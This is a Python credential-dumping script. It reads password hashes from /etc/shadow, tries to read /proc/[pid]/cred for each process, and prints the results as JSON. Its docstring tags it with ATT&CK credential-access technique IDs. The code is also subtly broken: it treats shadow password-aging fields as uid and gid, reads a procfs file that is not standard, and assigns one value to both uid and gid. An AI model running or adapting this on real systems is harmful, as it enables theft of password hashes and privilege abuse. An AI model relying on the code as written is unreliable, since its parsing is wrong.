import os
import json


def dump_credentials() -> dict:
    """
    Dumps credentials by reading /etc/shadow and iterating through
    /proc/[pid]/cred to extract process credential information.
    
    Returns a dictionary keyed by username (for shadow entries) or PID
    (for proc/cred entries), containing the extracted credential fields.
    
    ATT&CK: T1003.008, T1003.007, T1552.001
    """
    credentials = {}

    # Read /etc/shadow and parse username/password fields
    try:
        with open('/etc/shadow', 'r') as f:
            for line in f:
                parts = line.strip().split(':')
                if len(parts) >= 2:
                    username = parts[0]
                    password_hash = parts[1]
                    credentials[username] = {
                        "source": "/etc/shadow",
                        "password_hash": password_hash,
                        "uid": int(parts[3]) if len(parts) > 3 else None,
                        "gid": int(parts[4]) if len(parts) > 4 else None,
                    }
    except FileNotFoundError:
        pass
    except PermissionError:
        pass

    # Iterate through /proc/[pid]/cred for each process
    try:
        proc_dir = '/proc'
        for pid in os.listdir(proc_dir):
            if pid.isdigit():
                cred_path = f'{proc_dir}/{pid}/cred'
                try:
                    with open(cred_path, 'r') as f:
                        content = f.read()
                        # Parse the credential file format (key-value pairs)
                        for line in content.strip().split('\n'):
                            if ':' in line and not line.startswith('#'):
                                key, value = line.split(':', 1)
                                credentials[pid] = {
                                    "source": f"/proc/{pid}/cred",
                                    "uid": int(value),
                                    "gid": int(value),
                                    "groups": [],
                                    "capabilities": {},
                                }
                except FileNotFoundError:
                    pass
    except FileNotFoundError:
        pass

    return credentials


if __name__ == '__main__':
    result = dump_credentials()
    print(json.dumps(result, indent=2))
